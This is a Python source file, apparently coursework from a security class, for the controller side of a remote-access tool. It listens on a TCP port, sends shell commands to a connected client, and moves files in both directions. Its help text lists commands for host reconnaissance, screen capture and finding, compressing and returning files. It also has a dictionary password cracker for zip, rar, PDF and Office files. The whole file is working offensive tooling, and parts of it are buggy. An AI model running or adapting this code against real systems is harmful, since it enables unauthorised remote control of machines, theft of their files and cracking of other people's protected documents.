# -*- coding:utf-8 -*-
import socket
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase #附件
from email.mime.text import MIMEText
from email import encoders #转码
from datetime import date
from email.header import Header
import sys
import getpass
import zipfile
from ftplib import FTP
import msoffcrypto
import zipfile
import PyPDF4
import rarfile
import threading
import optparse

##############################################################解密################################################################
def progressbar(nowprogress,toyal):    #nowprogress现在的进度数   toyal#总数
    get_progress=int((nowprogress+1)*(50/toyal))   #显示多少>
    get_pro=int(50-get_progress)#显示多少-
    percent=(nowprogress+1)*(100/toyal)
    print("\r"+"["+">"*get_progress+"-"*get_pro+']'+"%.2f" % percent + "%",end="")
    
def extractzipFile(File,password):
    '''
    破解方法
    :param File: 需要破解的文件
    :param password: 尝试密码
    :return: 
    '''
    try:
        
        File.extractall(pwd = password.encode())
        print("Found Passwd:", password)
        # event.set()
        sys.exit()
        return 1
    except:
        # event.wait()
        pass
def extractrarFile(File,password):
    '''
    破解方法
    :param File: 需要破解的文件
    :param password: 尝试密码
    :return: 
    '''
    try:
        
        File.extractall(pwd = password)
        print("Found Passwd:", password)
        # event.set()
        return password
    except:
        # event.wait()
        pass
def extractpdfFile(File,password):
    '''
    破解方法
    :param File: 需要破解的文件
    :param password: 尝试密码
    :return: 
    '''
    try:
        
        File.decrypt(password)
        print("Found Passwd:", password)
        # event.set()
        return password
    except:
        # event.wait()
        pass
def extractoffFile(File,password):
    '''
    破解方法
    :param File: 需要破解的文件
    :param password: 尝试密码
    :return: 
    '''
    try:
        File.load_key(password)
        File.decrypt(open("new"+File, "wb"))
        # File.extractall(pwd = password)
        print("Found Passwd:", password)
        # event.set()
        return password
    except:
        # event.wait()
        pass

def crackfile():
    '''
    主函数
    '''
    # zFile=zipfile.ZipFile(r'E:\学习。\攻防\teachergive2\第一天\one\zip.zip')
    # passFile=open(r'E:\学习。\攻防\teachergive2\第一天\one\password.txt',encoding="utf-8")
    
    # parser = optparse.OptionParser("usage %prog "+\
    #         "-f <file> -d <dictionary>")
    # parser.add_option('-f',dest = 'zname',type = 'string',help = 'specify file')
    # parser.add_option('-d',dest = 'dname',type = 'string',help = 'specify dictionary')
    # (options,args) = parser.parse_args()
    # if(options.zname == None) | (options.dname == None):
    #     print(parser.usage)
        
    #     exit(0)
    # else:
    #     zname = options.zname
    #     dname = options.dname
    # if zname.endswith('.zip'):
    #     File = zipfile.ZipFile(zname)
    #     label = 0
    # elif zname.endswith('.rar'):
    #     File = rarfile.RarFile(zname)
    #     label = 1
    # File = zipfile.ZipFile(zname)
    try:


        filename = input("input filename: ")
        passtxt = input("input passtxt: ")
        label = input("input label: ")
        label = int(label)

        # filename="zip.zip"
        # passtxt="password.txt"
        # label = 0

        
        if label == 0:
            File = zipfile.ZipFile(filename)
        elif label == 1:
            File = rarfile.RarFile(filename)
        elif label == 2:
            File = PyPDF4.PdfFileReader(open(filename,'rb'))
        elif label == 3:
            File = msoffcrypto.OfficeFile(open(filename, "rb"))
        else:
            print("crack error")
            return

        passFile = open(passtxt)
        # print(zname)
        # print(dname)
        zpw=passFile.readlines()
        result=0
        for line in zpw:
            progressbar(zpw.index(line),len(zpw))
            
            # if event.isSet():
            #     print("End")
            #     return
            # else:
                
            pwdline = line.strip('\n')
            pwdlist = pwdline.split()
            for password in pwdlist:
                if(label==0 ):
                    # t = threading.Thread(target=extractzipFile, args=(File, password))
                    result=extractzipFile(File, password)
                elif(label==1):
                    # t = threading.Thread(target=extractrarFile, args=(File, password))
                    extractrarFile(File, password)
                elif(label==2):
                    # t = threading.Thread(target=extractpdfFile, args=(File, password))
                    extractpdfFile(File, password)
                elif(label==3):
                    # t = threading.Thread(target=extractoffFile, args=(File, password))
                    extractoffFile(File, password)
                # t.start()    
            if(result==1):
                sys.exit()
                return 1
    except:
        print("input error")
        pass

            	


##############################################################解密################################################################

##############################################################文件传输与发送#######################################################
def creat_folder(path):
    if os.path.exists(path):
        return
    else:
        os.mkdir(path)


def send_handle(file_name, file_size, client_server):
    """
    处理传输文件数据，将文件读取并发送到接收端，只允许单次发送
    单次发送失败后需要进行重连再重新发送
    :param file_name: 要发送的文件名
    :param file_size: 要发送的文件的大小
    :param client_server: 用于传输数据的socket，发送端的socket
    :return: 发送文件的结果，1为发送成功，0为发送失败
    """
    al_read_size = 0  # 保存已读取的文件大小，显示读取的进度
    if file_name and file_size:
        # 判断传入的文件信息是否空
        client_server.send(b"starting send file")
        with open(file_name, "rb") as f:
            while True:
                # 循环读取文件
                file_content = f.read(1024)  # 每次从文件种读取1M数据
                al_read_size += len(file_content)  # 计算总共读取的数据的大小
                if file_content:  # 判断文件是否读取完了
                    print("{}%".format(al_read_size/file_size))  # 输出读取文件的进度
                    client_server.send(file_content)  # 将读取的文件发送到服务端
                else:
                    print("100%")  # 判断文件读取完了，输出读取的进度
                    return 1  # 文件读取发送完了，返回处理情况
    else:
        print("Can't find the file or the file is empty.")  # 打开文件失败，文件或文件名为空，则退出发送服务
        client_server.send(b'cancel send file.')  # 通知服务端取消文件的发送
        return 0  # 文件未发送成功，返回0


def send_server(client_server,file_name):
    # 输入需要发送的文件名，包括文件后缀。仅限二进制文件，包括图片、视频、压缩文件等
    # file_name = input("Please enter the file path or the file name:")
    if os.path.exists(file_name) and (not os.path.isdir(file_name)):  # 判断文件是否存在，是否文件夹
        # 获取文件的大小
        file_size = os.path.getsize(file_name)
        file_message = file_name + "|" + str(file_size)
        # 与服务端建立连接后，先将文件名字与文件的大小发送给服务端
        client_server.send(file_message.encode())
        # 对方接收到了file_message的信息后返回一个“copy”，接收不成功会返回别的信息
        recv_data = client_server.recv(1024)
        # 判断对方是否接收信息成功
        if recv_data.decode() == "copy":
            print("start to send data...")
            start_time = time.time()  # 计算发送文件的开始时间
            send_flag = send_handle(file_name, file_size, client_server)  # 发送文件的请求处理，返回处理结果
            end_time = time.time()  # 计算发送文件的结束时间
            spend_time = end_time - start_time  # 计算发送文件的耗时
            print("sending file spend {} s".format(spend_time))  # 在控制台输出发送文件的耗时

            if send_flag:  # 判断文件是否发送成功
                recv_message = client_server.recv(1024).decode()
                if recv_message == "ok":
                    # 文件发送成功
                    print("send file successful, close the client server.")
                    # client_server.send(b'over send file.')

                    # client_server.close()
                    return 1
                else:
                    # 对方文件接收不成功
                    print("server recv file failed.")
                    # client_server.close()
                    return 0
            else:
                # 文件发送不成功
                print("Error,failed to send the file.")
                # client_server.close()
                return 0

        else:
            # 对方没有接收到文件名及文件大小，或者对方断开了连接，取消发送文件，并关闭socket，退出发送服务
            print("Can't recv the server answer.")
            print("The client don't send the file data and close the server.")
            # client_server.close()
            return 0
    # try:
    #     client_server.close()  # 尝试关闭本方的socket，防止前面没有进行关闭，如果前面已经关闭了，直接退出函数
    # except Exception:
    #     pass
    else:
        print("no this file")
        client_server.send(b'no this file.')
        return



def recv_handle(file_path, file_size, client_server):
    """
    接收文件的处理函数，只允许单次接收，一次接收失败后需要重新建立连接后重新发送
    :param file_path: 保存文件的路径
    :param file_size: 要接收的文件的大小
    :param client_server: 传输服务的socket
    :return: 接收文件的结果，1表示接收成功，0表示接收失败
    """
    print("Start to recv th file...",file_size)
    file_size = int(file_size)
    recv_size = 0  # 保存接收的文件的大小
    start_time = time.time()  # 保存开始接收文件的时间
    with open(file_path, "ab") as f:
        while recv_size < file_size:
            # 循环接收文件数据
            file_content = client_server.recv(file_size+1)
            if recv_size < file_size:  # 判断文件是否接收完了
                recv_size += len(file_content)  # 累计接收的文件大小
                f.write(file_content)  # 将接收的数据保存到文件中
            else:
                # 如果文件接收完了，则退出循环
                end_time = time.time()  # 保存文件接收结束的时间
                print("spend time:{}".format(end_time - start_time))
                break

    if recv_size == file_size:  # 判断接收的文件大小与对方发送的文件大小是否一致
    	end_time = time.time()
    	print("文件全部接收完毕，耗时：{}".format(end_time - start_time))
    	client_server.send(b'ok')
    	f.close()
    	return 1
    else:
        print("文件未接收完成，只接收了{}%".format(recv_size/file_size))
        print("Failed to recv the file.")
        client_server.send(b'fail')
        return 0


def recv_server(client_server):
    print("Ready to recv the file...")
    # 接收发送端发送的文件名及文件大小
    recv = client_server.recv(1024).decode()
    if recv == "no this file.":
    	return
    
    
    file_name, file_size = recv.split("|")
    # file_name, file_size = client_server.recv(1024).decode().split("|")
    creat_folder("Resource")
    file_path = os.path.join("Resource", file_name)
    # 判断文件名及文件大小是否为空
    if file_name and file_size:
        client_server.send(b'copy')  # 反馈文件发送端，已收到文件名及文件大小
        start_flag = client_server.recv(1024).decode()
        print("start_flag",start_flag)
        if start_flag == "starting send file":
            recv_flag = recv_handle(file_path, file_size, client_server)  # 启用文件接收服务
            # 判断文件的接收结果
            if recv_flag:
                #client_server.close()
                print("文件接收成功")
                return
            else:
                print("文件接收失败")
                #client_server.close()
        else:
            print("对方拒绝发送文件")
            #client_server.close()
            return
    else:
        # 文件名或文件大小为空，拒绝接收文件，断开连接
        client_server.send(b'refuse')
        # client_server.colse()
        return
##############################################################文件传输与发送#######################################################

def send(socket, message):
    send_data = message.encode("gbk")
    # 发送数据
    socket.send(send_data)
def help():
    print("\nhostpacket : search IP,mac,os,username...")
    print("cut : cut screen and find server,port...")
    print("crackfile: crack this file\n(    label = 0 stand for zip)\n(    label = 1 stand for rar)\n(    label = 2 stand for pdf)\n(    label = 3 stand for office)")
    print("findfile: give dir ,then search file ,compress and return")
    print("upload: give filename ,then upload")
    print("download: give filename,then download")
    print("help: display some help information")
    print("You can enter some simple commands\n")


def main():
    # 创建tcp服务端套接字
    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 设置端口号复用，让程序退出端口号立即释放
    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)
    # 给程序绑定端口号
    tcp_server_socket.bind(("", 8988))
    # 设置监听
    # 128:最大等待建立连接的个数， 提示： 目前是单任务的服务端，同一时刻只能服务与一个客户端，后续使用多任务能够让服务端同时服务于多个客户端
    # 不需要让客户端进行等待建立连接
    # listen后的这个套接字只负责接收客户端连接请求，不能收发消息，收发消息使用返回的这个新套接字来完成
    tcp_server_socket.listen(128)
    # 等待客户端建立连接的请求, 只有客户端和服务端建立连接成功代码才会解阻塞，代码才能继续往下执行
    # 1. 专门和客户端通信的套接字： service_client_socket
    # 2. 客户端的ip地址和端口号： ip_port
    service_client_socket, ip_port = tcp_server_socket.accept()
    # 代码执行到此说明连接建立成功
    print("客户端的ip地址和端口号:", ip_port)
    # 接收客户端发送的数据, 这次接收数据的最大字节数是1024
    recv_data = service_client_socket.recv(1024)
    # 获取数据的长度
    recv_data_length = len(recv_data)
    print("接收数据的长度为:", recv_data_length)
    # 对二进制数据进行解码
    recv_content = recv_data.decode("gbk")
    print("接收客户端的数据为:", recv_content)
    # 准备发送的数据
    send_data = "ok, ...".encode("gbk")
    # 发送数据给客户端
    service_client_socket.send(send_data)
    # 关闭服务与客户端的套接字， 终止和客户端通信的服务

    while True:
        recv_data = service_client_socket.recv(1024)
        recv_content = recv_data.decode("gbk")
        print("recv",recv_content)

        next_cmd = input("Enter shell command or quit: ")
        if next_cmd.startswith("upload ") == True:
            file_name = next_cmd[7:].rstrip()
            # upload(client, file_name)    
            service_client_socket.send("upload ".encode("gbk"))
            send_server(service_client_socket,file_name)

        elif next_cmd.startswith("download ") == True:
            file_name = next_cmd[9:].rstrip()
            service_client_socket.send(next_cmd.encode("gbk"))
            recv_server(service_client_socket)

        elif next_cmd.startswith("crackfile") == True:
            print("crackcrackcrack")
            # event = threading.Event()
            crackfile()
            service_client_socket.send("crack".encode("gbk"))
            

        elif next_cmd.startswith("hostpacket") == True:
            
            service_client_socket.send(next_cmd.encode("gbk"))

        elif next_cmd.startswith("findfile ") == True:
            service_client_socket.send(next_cmd.encode("gbk"))

        elif next_cmd.startswith("cut") == True:
            service_client_socket.send(next_cmd.encode("gbk")) 

        elif next_cmd.startswith("help") == True:
            help()
            service_client_socket.send(next_cmd.encode("gbk"))

        

        elif next_cmd != '':
            send(service_client_socket, next_cmd)




    service_client_socket.close()
    # 关闭服务端的套接字, 终止和客户端提供建立连接请求的服务
    tcp_server_socket.close()

if __name__ == "__main__":
    main()